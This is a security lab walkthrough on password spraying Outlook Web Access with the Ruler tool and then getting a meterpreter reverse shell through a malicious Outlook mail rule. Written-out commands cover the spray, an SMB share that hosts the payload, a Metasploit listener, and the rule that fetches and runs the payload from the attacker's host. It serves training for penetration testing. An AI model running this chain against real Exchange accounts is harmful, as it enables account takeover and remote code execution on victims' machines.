# Password Spraying Outlook Web Access: Remote Shell

## Context

This lab looks at an attacking technique called password spraying as well as abusing Outlook Web Application by exploiting mail rules to get a remote shell using a tool called `Ruler`.

## Defininitions

**Password spraying** is an attacking technique and a form of password brute-forcing. In password spraying, an attacker cycles through a list of possible usernames \(found using OSINT techniques against a target company or other means\) with a couple of most common passwords. In comparison, a traditional bruteforce works by selecting a username from the list and trying all the passwords in the wordlist against that username. Once all passwords are exhausted, another username is chosen from the list and the process repeats.

Password spraying could be illustrated with the following table:

| User | Password |
| :--- | :--- |
| john | Winter2018 |
| ben | Winter2018 |
| ... | Winter2018 |
| john | December2018! |
| ben | December2018! |
| ... | December2018! |

Standard password bruteforcing could be illustrated with the following table:

| User | Password |
| :--- | :--- |
| john | Winter2018 |
| john | Winter2018! |
| john | Password1 |
| ben | Winter2018 |
| ben | Winter2018! |
| ben | Password1 |

## Password Spraying

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-12-23-15-09-03.png)

![](../.gitbook/assets/peek-2018-12-23-15-07.gif)

The above shows that password spray was successful against the user `spotless` who used a weak password `123456`.

Note, that if you are attempting to replicate this technique in your own labs, you may need to update your /etc/hosts to point to your Exchange server:

![](../.gitbook/assets/screenshot-from-2018-12-23-15-08-18.png)

## Getting a Shell via Malicious Email Rule

### Overview

If password spray against an Exchange server was successful and you have obtained valid credentials, you can leverage `Ruler` to create a malicious email rule to gain remote code execution on the host that checks that compromised mailbox.

A high level overwiew of how the spraying and remote code execution works:

* you have obtained working credentials during the spray for the user `spotless@offense.local`
* witht the help of `Ruler`, a malicious mail rule is created for the compromised account which in our case is `spotless@offense.local`. The rule created will conform to the format along the lines of: `if emailSubject contains` **`someTriggerWord`**_`start`_**`pathToSomeProgram`**
* A new email with subject containing `someTriggerWord` is sent to the `spotless@offense.local`
* User spotless logs on to his/her workstation and launches Outlook to check for new email
* Malicious email comes in and the malicious mail rule is triggered, which in turn launches starts the program specified in `pathToSomeProgram`

### Execution

Let's validate the credentials are working by checking if there are any email rules created already:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```
{% endcode-tabs-item %}
{% endcode-tabs %}

The below suggests the credentials are working and that no mail rules are set for this account:

![](../.gitbook/assets/screenshot-from-2018-12-23-17-15-36.png)

To carry the attack further, I've generated a reverse meterpreter payload and saved it as a windows executable and saved it to `/root/tools/evilm64.exe`

We need to create an SMB share of the location where our evilm64.exe is located - this is the program we want executed on the host that checks the mailbox for which we have compromised the credentials during the password spray:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
smbserver.py tools /root/tools/
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Next, we setup a metasploit listener to catch the reverse shell:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
use exploit/multi/handler 
set lhost 10.0.0.5
set lport 443
exploit
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Finally, we fire up the ruler and create the malicious email rule, to get remote code execution:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Below shows the entire attack and all of the steps mentioned above in action - note how the compromised mailbox does not even get to see the malicious email coming in:

![](../.gitbook/assets/peek-2018-12-23-18-13.gif)

Below shows the actual malicious rule that got created as part of the attack - note the `subject` and the `start` properties - we specified them in the ruler command:

![](../.gitbook/assets/screenshot-from-2018-12-23-18-17-10.png)

If you want to delete the malicious email rule, do this:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Detection & Mitigation

{% embed url="https://www.microsoft.com/en-us/microsoft-365/blog/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/" %}

## References

{% embed url="https://github.com/sensepost/ruler/wiki" %}



